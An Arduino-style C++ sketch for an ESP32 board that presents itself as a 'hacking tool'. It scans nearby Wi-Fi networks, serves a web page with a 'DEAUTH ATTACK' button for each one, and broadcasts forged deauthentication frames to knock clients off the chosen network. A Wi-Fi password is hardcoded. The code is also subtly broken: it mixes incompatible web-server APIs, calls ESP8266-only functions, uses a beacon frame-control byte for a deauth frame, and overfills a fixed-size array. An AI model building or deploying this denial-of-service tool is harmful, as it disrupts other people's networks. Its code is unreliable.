#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>
#include <ArduinoJson.h>

// Network credentials for AP mode
const char* ssid = "bara";
const char* password = "A7med@Elshab7";

// Web server object
AsyncWebServer server(80);

// Global variables
String scanResults = "";
bool isScanning = false;

// Helper function to convert MAC to string
String macToString(const uint8_t *mac) {
  char buf[18];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

// Handle root URL
void handleRoot() {
  String html = "<html>\n<head>\n"
                "<title>HACKING TOOL - BARA</title>\n"
                "<style>\n"
                "body {\n"
                "  background-color: #1a0000;\n"
                "  color: #ff3333;\n"
                "  font-family: \'Courier New\', monospace;\n"
                "  margin: 0;\n"
                "  padding: 20px;\n"
                "}\n"
                "h1 {\n"
                "  color: #ff0000;\n"
                "  text-shadow: 0 0 10px #ff0000;\n"
                "}\n"
                ".container {\n"
                "  max-width: 800px;\n"
                "  margin: 0 auto;\n"
                "}\n"
                ".network-item {\n"
                "  background-color: rgba(255, 0, 0, 0.1);\n"
                "  border: 1px solid #ff3333;\n"
                "  border-radius: 5px;\n"
                "  padding: 10px;\n"
                "  margin-bottom: 10px;\n"
                "}\n"
                "button {\n"
                "  background-color: #ff0000;\n"
                "  color: white;\n"
                "  border: none;\n"
                "  padding: 10px 20px;\n"
                "  border-radius: 5px;\n"
                "  cursor: pointer;\n"
                "  margin-right: 10px;\n"
                "}\n"
                "button:hover {\n"
                "  background-color: #cc0000;\n"
                "}\n"
                "</style>\n"
                "</head>\n<body>\n"
                "<div class=\"container\">\n"
                "<h1>BARA HACKING TOOL</h1>\n"
                "<p>Developer: Ahmed Nour Ahmed - Qena</p>\n"
                "<hr>\n"
                "<h2>Available Networks</h2>\n"
                "<button onclick=\"location.reload()\">Refresh Scan</button>\n"
                "<div id=\"networks\">";
  
  if (scanResults.length() > 0) {
    html += scanResults;
  } else {
    html += "<p>No networks found or scan not performed yet.</p>";
  }
  
  html += "</div>\n"
          "</div>\n"
          "</body>\n"
          "</html>";
          
  server.send(200, "text/html", html);
}

// Handle scan request
void handleScan() {
  Serial.println("Starting WiFi scan...");
  isScanning = true;
  
  int n = WiFi.scanNetworks(false, false, false, 300, nullptr);
  
  if (n == 0) {
    scanResults = "<p>No networks found</p>";
  } else {
    scanResults = "";
    for (int i = 0; i < n; ++i) {
      scanResults += "<div class=\"network-item\">\n"
                     "<strong>" + WiFi.SSID(i) + "</strong><br>\n"
                     "Signal: " + WiFi.RSSI(i) + " dBm<br>\n"
                     "MAC: " + macToString(WiFi.BSSID(i)) + "<br>\n"
                     "Channel: " + WiFi.channel(i) + "<br>\n"
                     "Encryption: " + getEncryptionType(WiFi.encryptionType(i)) + "\n"
                     "<form action=\"/deauth\" method=\"get\">\n"
                     "<input type=\"hidden\" name=\"ssid\" value=\"" + WiFi.SSID(i) + "\">\n"
                     "<input type=\"hidden\" name=\"bssid\" value=\"" + macToString(WiFi.BSSID(i)) + "\">\n"
                     "<input type=\"hidden\" name=\"channel\" value=\"" + String(WiFi.channel(i)) + "\">\n"
                     "<button type=\"submit\">DEAUTH ATTACK</button>\n"
                     "</form>\n"
                     "</div>\n";
    }
  }
  
  isScanning = false;
  handleRoot();
}

// Convert encryption type to string
String getEncryptionType(int type) {
  switch(type) {
    case WIFI_AUTH_OPEN: return "Open";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA PSK";
    case WIFI_AUTH_WPA2_PSK: return "WPA2 PSK";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2 PSK";
    default: return "Unknown";
  }
}

// Handle deauthentication request
void handleDeauth() {
  if (server.args() == 0 || !server.hasArg("ssid") || !server.hasArg("bssid") || !server.hasArg("channel")) {
    server.send(400, "text/plain", "Missing parameters");
    return;
  }
  
  String ssid = server.arg("ssid");
  String bssidStr = server.arg("bssid");
  int channel = server.arg("channel").toInt();
  
  server.send(200, "text/plain", "Starting DEAUTH attack on " + ssid + " (" + bssidStr + ") on channel " + String(channel));
  
  // Start deauth attack
  deauthAttack(bssidStr, channel);
}

// Perform deauthentication attack
void deauthAttack(String bssidStr, int channel) {
  Serial.printf("Starting DEAUTH attack on %s (channel %d)\n", bssidStr.c_str(), channel);
  
  // Parse BSSID
  uint8_t bssid[6];
  sscanf(bssidStr.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
         &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
  
  // Change WiFi channel
  wifi_promiscuous_enable(0); // Disable promiscuous mode
  wifi_second_chan(WIFI_SECOND_CHAN_NONE);
  wifi_phy_set_channel(channel, PHY_SET_CHANNEL_ONLY);
  wifi_promiscuous_enable(1); // Re-enable
  
  // Get own MAC address
  uint8_t myMac[6];
  WiFi.macAddress(myMac);
  
  // Create deauth frame
  uint8_t deauthFrame[24] = {
    0x80, 0x0C,       // Frame Control (Deauth)
    0x00, 0x00,       // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
    myMac[0], myMac[1], myMac[2], myMac[3], myMac[4], myMac[5], // Source
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // BSSID
    0x00, 0x00,       // Sequence Control
    0x07, 0x00        // Reason Code (7: Deauthenticated because sender is leaving)
  };
  
  // Send deauth frames
  for (int i = 0; i < 50; i++) {
    wifi_send_pkt_freedom(deauthFrame, sizeof(deauthFrame), false);
    delay(10);
  }
  
  Serial.println("DEAUTH attack completed!");
}

void setup() {
  Serial.begin(115200);
  Serial.println("Starting BARA WiFi Tool...");
  
  // Set up AP
  WiFi.softAP(ssid, password);
  IPAddress IP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(IP);
  
  // Set up web server routes
  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/deauth", HTTP_GET, handleDeauth);
  
  // Start server
  server.begin();
  Serial.println("HTTP server started");
}

void loop() {
  // Keep the server running
  server.handleClient();
  
  // Add status indicator
  static unsigned long lastStatus = 0;
  if (millis() - lastStatus > 5000) {
    lastStatus = millis();
    Serial.printf("Active networks: %d\n", WiFi.scanComplete());
  }
}
